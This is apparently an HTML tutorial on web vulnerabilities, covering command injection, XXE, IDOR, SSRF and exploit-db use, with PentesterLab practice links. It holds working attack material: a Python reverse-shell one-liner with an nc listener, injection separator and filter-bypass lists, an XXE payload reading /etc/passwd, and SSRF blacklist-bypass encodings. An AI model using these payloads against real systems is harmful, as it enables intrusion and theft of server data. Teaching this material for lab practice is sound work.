@@ -1,0 +1,181 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="-web-vulnerabilites-">💪 <code>Web-Vulnerabilites</code> 💪</h1>
+<h2 id="-01-os-command-injection-">🥇01. OS Command Injection :</h2>
+<p><img src="https://user-images.githubusercontent.com/55437834/116801682-d6c45080-ab2d-11eb-8c38-cae9126833af.jpg" alt="command-injection-vulnerability"></p>
+<h3 id="what-is-os-command-injection-">What is OS Command Injection ?</h3>
+<p>OS Command Injection is server side  web vulnerablities where attacker execute :eyes:&quot; system command&quot;  like id, whoami ,uname etc os command  .
+It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.</p>
+<h3 id="types-of-os-commnad-injection-">Types Of OS Commnad Injection :</h3>
+<pre><code>                              There are <span class="hljs-literal">two</span> types <span class="hljs-keyword">of</span> OS <span class="hljs-keyword">command</span> <span class="hljs-title">injection</span>  <span class="hljs-title">such</span> <span class="hljs-title">as</span> :
+
+                                                                                    i. Active OS <span class="hljs-keyword">command</span> <span class="hljs-title">injection</span>
+
+                                                                                    ii. Blind OS <span class="hljs-keyword">command</span> <span class="hljs-title">injection</span>
+</code></pre><h3 id="active-os-command-injection-">Active OS Command Injection :</h3>
+<p>Active command injection will return the response to the user.  It can be made visible through several HTML elements. That means when a attacker execute :eyes: &quot;system command &quot;  like ls ,server will return result of ls .(Attacker will see the result of ls ) .It is so easy to execute . </p>
+<h4 id="os-command-injection-payloads-link-https-github-com-swisskyrepo-payloadsallthethings-tree-master-command-20injection">OS Command Injection Payloads link:<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a></h4>
+<h2 id="fuzzing-wordlist-using-burp-intruder">Fuzzing wordlist using Burp Intruder</h2>
+<pre><code><span class="xml">             ;
+            \n   -------- %0a
+             &amp;
+             |
+             ||
+             &amp;&amp;
+             ''
+             $()
+</span><span class="perl">             %26</span><span class="xml">
+</span><span class="perl">             %26%26</span><span class="xml">
+</span><span class="perl">             %3b</span><span class="xml">
+</span><span class="perl">             %7c%7c</span><span class="xml">
+</span><span class="perl">             %60%60</span><span class="xml"></span>
+</code></pre><h2 id="bypass-space-for-os-command-injection">Bypass Space for OS Command Injection</h2>
+<pre><code>                +
+                %09 ------- <span class="hljs-keyword">tab</span> ------ example: 127.0.0.1;<span class="hljs-keyword">ls</span>%09-<span class="hljs-keyword">la</span>
+                <span class="hljs-variable">${IFS}</span>
+                {<span class="hljs-keyword">ls</span>,-<span class="hljs-keyword">la</span>} ------ branch expansion -------- example:127.0.0.1%0a{<span class="hljs-keyword">ls</span>,-<span class="hljs-keyword">la</span>}
+</code></pre><h3 id="blind-os-command-injection-">Blind OS Command Injection :</h3>
+<p>Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document . That means when a  attacker execute &quot; system command &quot;  like ls ,server will not return result of ls but  server execute ls command . For  , seeing the result of :eyes: &quot;system command &quot; you must upload reverse shell on target / victim server . After uploading  reverse shell on victim server , you must be  listen uploaded shell on attacker terminal using nc command . </p>
+<h3 id="example-">Example :</h3>
+<pre><code>    ♥️  <span class="hljs-number">1</span>. upload <span class="hljs-keyword">reverse</span> shell :
+                              ; python -c <span class="hljs-symbol">'import</span> socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"dead:beef:2::125c"</span>,<span class="hljs-number">4242</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=pty.spawn(<span class="hljs-string">"/bin/sh"</span>);'
+
+       <span class="hljs-number">2</span>. listen <span class="hljs-keyword">reverse</span> shell :
+
+                             <span class="hljs-type">nc</span> -lnvp <span class="hljs-number">4242</span>
+</code></pre><p>Note : </p>
+<pre><code>   <span class="hljs-number">1.</span> Change ip according <span class="hljs-built_in">to</span> your <span class="hljs-built_in">local</span> host ip
+
+   <span class="hljs-number">2.</span> One can easily  uploaded  <span class="hljs-built_in">shell</span> <span class="hljs-keyword">if</span> OS <span class="hljs-keyword">command</span> <span class="hljs-title">injection</span> <span class="hljs-title">is</span> <span class="hljs-title">occured</span> .
+</code></pre><h1 id="-02-sqlite3-or-flat-file-">🥈02. Sqlite3 or &quot;flat-file&quot; :</h1>
+<p>When databases stored as a file it&#39;s called &quot;flat-file&quot;  .The extension of those file is db . ( like webapp.db , base.db )</p>
+<p>Process :</p>
+<pre><code>           <span class="hljs-number">1.</span>  At <span class="hljs-keyword">first</span>   download  <span class="hljs-string">" flat-file "</span> <span class="hljs-built_in">from</span> target web app  . ( Use dirsearch <span class="hljs-keyword">or</span> gobuster <span class="hljs-keyword">for</span> exposing  flat-<span class="hljs-built_in">file</span> <span class="hljs-built_in">directory</span> )
+
+           <span class="hljs-number">2.</span>  Then  , expose sensitve data <span class="hljs-built_in">from</span> <span class="hljs-string">"flat-file "</span>  <span class="hljs-keyword">using</span> sqlite3 
+</code></pre><p>Use Of Sqlite3 :</p>
+<pre><code>                   sqlite3 target_file 
+
+                  .help 
+
+                  .<span class="hljs-built_in">tables</span>
+
+                  .schema table_name
+
+                  <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> table_name ;  <span class="hljs-comment">// see more using sqlite3 command//</span>
+</code></pre><h1 id="-03-xml-or-xml-external-entity-or-xxe-">🥉03. XML OR XML External Entity OR XXE :</h1>
+<p><img src="https://user-images.githubusercontent.com/55437834/116801699-ff4c4a80-ab2d-11eb-80b6-af5d72d7ff85.jpg" alt="XXE-banner-1024x536-1-1024x536"></p>
+<p>An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.</p>
+<h4 id="-1-disadvantage-of-xml-attack-">:-1:Disadvantage of XML attack :</h4>
+<pre><code>                                       <span class="hljs-number">1</span>. Cause <span class="hljs-keyword">of</span>  Denial <span class="hljs-keyword">of</span> Service (DoS) attack
+
+                                       <span class="hljs-number">2</span>. Could <span class="hljs-keyword">use</span> XXE <span class="hljs-keyword">to</span> perform Server-<span class="hljs-literal">Side</span> Request Forgery (SSRF) 
+
+                                       <span class="hljs-number">3</span>.  XXE may even enable <span class="hljs-keyword">port</span> scanning <span class="hljs-keyword">and</span> lead <span class="hljs-keyword">to</span> remote code execution.
+</code></pre><h4 id="there-are-two-types-of-xxe-attacks-">There are Two types of XXE attacks :</h4>
+<pre><code>                                                  <span class="hljs-number">1</span>. <span class="hljs-keyword">in</span>-band xxe
+
+                                                  <span class="hljs-number">2</span>.<span class="hljs-keyword">out</span>-<span class="hljs-keyword">of</span>-band xxe
+</code></pre><p>1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.</p>
+<p>2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.</p>
+<h5 id="-pray-note-for-better-understanding-you-need-to-learn-basic-of-xml-language">:pray:Note : For better understanding you need to learn basic of XML language</h5>
+<h3 id="-xxe-payload-">👀 XXE Payload :</h3>
+<p>Now we&#39;ll see some XXE payload and see how they are working.</p>
+<p>1) The first payload we&#39;ll see is very simple. If you have  basic knowledge about XML language you can easily understand it :</p>
+<pre><code>     <span class="hljs-meta">&lt;!DOCTYPE replace [&lt;!ENTITY name "feast"&gt; ]&gt;</span>
+     <span class="hljs-tag">&lt;<span class="hljs-name">userInfo</span>&gt;</span>
+       <span class="hljs-tag">&lt;<span class="hljs-name">firstName</span>&gt;</span>falcon<span class="hljs-tag">&lt;/<span class="hljs-name">firstName</span>&gt;</span>
+       <span class="hljs-tag">&lt;<span class="hljs-name">lastName</span>&gt;</span>&amp;name;<span class="hljs-tag">&lt;/<span class="hljs-name">lastName</span>&gt;</span>
+     <span class="hljs-tag">&lt;/<span class="hljs-name">userInfo</span>&gt;</span>
+</code></pre><p>As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.</p>
+<p>2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword</p>
+<pre><code>     <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+     <span class="hljs-meta">&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;]&gt;</span>
+     <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;read;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre><p>Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to <code>SYSTEM</code> and path of the file.</p>
+<p>If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.</p>
+<p>In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.</p>
+<h1 id="-04-broken-access-idor-">🔊04.Broken Access -IDOR :</h1>
+<p><img src="https://user-images.githubusercontent.com/55437834/116801663-a977a280-ab2d-11eb-9b3d-b002ec8099e5.png" alt="116019462_282530606501791_5738413798267894160_n"></p>
+<h5 id="idor-or-insecure-direct-object-reference-is-the-act-of-exploiting-a-misconfiguration-in-the-way-user-input-is-handled-to-access-resources-you-wouldn-t-ordinarily-be-able-to-access-idor-is-a-type-of-access-control-vulnerability-">IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn&#39;t ordinarily be able to access. IDOR is a type of access control vulnerability.</h5>
+<p>For example, let&#39;s say we&#39;re logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this <a href="https://example.com/bank?account_number=1234">https://example.com/bank?account_number=1234</a>. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.</p>
+<p>There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else&#39;s bank information.</p>
+<h3 id="-conclusion-of-idor-when-you-change-the-value-of-get-post-parameter-you-will-see-other-user-information-">👁️ Conclusion of IDOR : When  you change the value of (get /post) parameter  , you will see other user information .</h3>
+<h1 id="-05-components-with-known-vulnerabilities-">🧚‍♂️05. Components With Known Vulnerabilities :</h1>
+<ul>
+<li><p>Occasionally, you may find that the company/entity that you&#39;re pen-testing is using a program that already has a well documented vulnerability.</p>
+</li>
+<li><p>For example, let&#39;s say that a company hasn&#39;t updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it&#39;s version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on exploit-db.</p>
+</li>
+</ul>
+<p>Process :</p>
+<pre><code>       <span class="hljs-number">1</span>. Analize target website <span class="hljs-keyword">and</span>  findout version , <span class="hljs-keyword">name</span> etc <span class="hljs-keyword">of</span> target <span class="hljs-keyword">platform</span> .
+
+       <span class="hljs-number">2</span>. <span class="hljs-keyword">Then</span> , checkout those versuon ,<span class="hljs-keyword">name</span> are vulnerable <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span>  via exploit db ,rapid7  etc .
+
+       <span class="hljs-number">3</span>. <span class="hljs-keyword">If</span> target webiste version <span class="hljs-keyword">is</span> vulnerable  you can easily hacked your targer website via those process .
+</code></pre><h4 id="example-">Example :</h4>
+<p>Suppose  , Our  target website   like this :</p>
+<p><img src="https://user-images.githubusercontent.com/55437834/116803690-c024f600-ab3b-11eb-99ad-270fef1d027a.png" alt="bSuhuhp"></p>
+<p>After analyzing  , we realize that  our target  website create by &quot;Nostromo&quot;  .  Ok  , thats great  .Now ,follow our previous process :</p>
+<ol>
+<li><p>Search  &quot;Nostromo&quot; on exploit db </p>
+</li>
+<li><p>find out specific exploitation according to our target version (Here  , nostromo 1.9.6 )</p>
+</li>
+<li><p>Then , Download exploit file and  execute it</p>
+</li>
+</ol>
+<h4 id="command-">Command :</h4>
+<pre><code>      download_file<span class="hljs-selector-class">.py</span> target_url  id 
+</code></pre><p>Here , you can use any linux os command instead of id </p>
+<h1 id="-06-ssrf-sever-side-request-forgery-">🐞 06. SSRF(Sever Side Request Forgery ) :</h1>
+<p><img src="https://user-images.githubusercontent.com/55437834/116801458-070aef80-ab2c-11eb-8860-23590d56bd1a.jpg" alt="server-side-request-forgery-vulnerability-ssrf"></p>
+<h3 id="what-is-ssrf-">What is SSRF ?</h3>
+<h4 id="server-side-request-forgery-also-known-as-ssrf-is-a-web-security-vulnerability-that-allows-an-attacker-to-induce-the-server-side-application-to-make-http-requests-to-an-arbitrary-domain-of-the-attacker-s-choosing-">Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker&#39;s choosing .</h4>
+<h4 id="simply-ssrf-is-a-web-vulnerability-which-help-an-attacker-to-get-gain-information-from-target-server-attacker-can-gain-any-data-from-sever-for-that-it-s-called-server-side-request-forgery-">Simply , SSRF is a web vulnerability which help an attacker to get / gain information from target server . Attacker  can gain any  Data from Sever  for that It&#39;s called Server Side Request Forgery .</h4>
+<h2 id="what-is-the-impact-of-ssrf-attacks-">What is the impact of SSRF attacks?</h2>
+<ol>
+<li>Attacker can unauthorized action or access</li>
+<li>Attacke can see any data of server</li>
+<li>Attacker can execute 3rd party mallicious website</li>
+</ol>
+<h2 id="-how-one-can-find-ssrf-">👽 How One Can  Find SSRF :</h2>
+<p>Step 1 :
+        At first findout any get parameter that is use for data loaded ( Like url,data,id  )
+Suppose , you have this website <a href="http://ptc-b59f8e4f-a516ccb2.libcurl.so/">http://ptc-b59f8e4f-a516ccb2.libcurl.so/</a> </p>
+<p>After  , recon you find get parameter of this website <a href="http://ptc-b59f8e4f-a516ccb2.libcurl.so/?url">http://ptc-b59f8e4f-a516ccb2.libcurl.so/?url</a></p>
+<p>Now , you can test LFI, RFI And SSRF on this  website </p>
+<p>Step 2:
+       Use loopback ip after target url and use port number</p>
+<pre><code><span class="hljs-symbol">  http:</span><span class="hljs-comment">//ptc-b59f8e4f-a516ccb2.libcurl.so/?url=http://127.0.0.1:1234</span>
+</code></pre><p>You will see information of 1234 port </p>
+<h5 id="-note-developer-can-whitelist-and-blacklist-for-our-input">👀 Note : Developer can whitelist and blacklist for our input</h5>
+<h2 id="-bypassing-ssrf-protection-">🔥 Bypassing SSRF Protection :</h2>
+<p>There are two main types of SSRF protection mechanisms out there:</p>
+<pre><code>                                                <span class="hljs-keyword">blacklists </span><span class="hljs-keyword">and
+</span>                                                whitelists
+</code></pre><p>Blacklists refer to the practice of not allowing certain addresses and blocking the request if a blacklisted address was received as input. Most SSRF protection takes the form of blacklisting internal network address blocks.</p>
+<p>On the other hand, whitelists mean that a server would only allow through requests that contain URLs on a prespecified list and fail all other requests</p>
+<h3 id="-bypassing-blacklists-">📷 Bypassing Blacklists :</h3>
+<pre><code>                  <span class="hljs-number">1.</span>Try <span class="hljs-keyword">using</span> IPv6 addresses instead <span class="hljs-keyword">of</span> IPv4
+                  <span class="hljs-number">2.</span>Use Hex Encoding instead <span class="hljs-keyword">of</span> Decimal <span class="hljs-built_in">number</span> (<span class="hljs-keyword">http</span>://<span class="hljs-number">0x7f</span><span class="hljs-number">.0</span>x0<span class="hljs-number">.0</span>x0<span class="hljs-number">.0</span>x1)
+                  <span class="hljs-number">3.</span>Use Octal Encoding insted <span class="hljs-keyword">of</span> Decimal <span class="hljs-built_in">number</span> (<span class="hljs-keyword">http</span>://<span class="hljs-number">0177.0</span><span class="hljs-number">.0</span><span class="hljs-number">.01</span>)
+                  <span class="hljs-number">4.</span>Use Dword Encodinf( <span class="hljs-keyword">http</span>://<span class="hljs-number">2130706433</span>)
+                  <span class="hljs-number">5.</span>Use <span class="hljs-built_in">URL</span> Encoding (%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>)
+                  <span class="hljs-number">6.</span>Use Mixed Encoding (<span class="hljs-number">0177.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>x1)
+                  <span class="hljs-number">7.</span>Tricking <span class="hljs-keyword">it</span> <span class="hljs-keyword">with</span> DNS
+                  <span class="hljs-number">8.</span>Fooling <span class="hljs-keyword">it</span> <span class="hljs-keyword">with</span> redirects
+                  <span class="hljs-number">9.</span>Use localhost instead <span class="hljs-keyword">of</span> <span class="hljs-number">127.0</span><span class="hljs-number">.01</span> (<span class="hljs-keyword">http</span>://localhost:<span class="hljs-number">1234</span>)
+</code></pre><h4 id="practice-website-link-">Practice Website Link :</h4>
+<pre><code>                   level <span class="hljs-number">1</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://ptc-e5e344a9-ab23ba80</span>.libcurl.so/?url=<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/assets.pentesterlab.com/hacker</span>.txt
+                   level <span class="hljs-number">2</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://ptc-a04fcdce-f9f12764</span>.libcurl.so/?url=<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/assets.pentesterlab.com/hacker</span>.txt
+                   level <span class="hljs-number">3</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://ptc-b59f8e4f-a516ccb2</span>.libcurl.so/?url=<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/assets.pentesterlab.com/hacker</span>.txt
+                   level <span class="hljs-number">4</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://ptc-</span><span class="hljs-number">50</span>a250d6-<span class="hljs-number">842795</span>bb.libcurl.so/?url=<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/assets.pentesterlab.com/hacker</span>.txt
+</code></pre><h4 id="resoures-link-">Resoures Link :</h4>
+<pre><code>           <span class="hljs-number">1.</span>https://portswigger.net/web-security/ssrf ( <span class="hljs-type">Theory</span> about <span class="hljs-type">SSRF</span>)
+           2.https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b (<span class="hljs-type">Bypass</span> )
+           3.https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4    (<span class="hljs-type">Bypass</span> <span class="hljs-type">Payload</span> <span class="hljs-type">List</span> )
+</code></pre><h3 id="-happy-hacking-">😍Happy Hacking 😍</h3>
+</body></html>
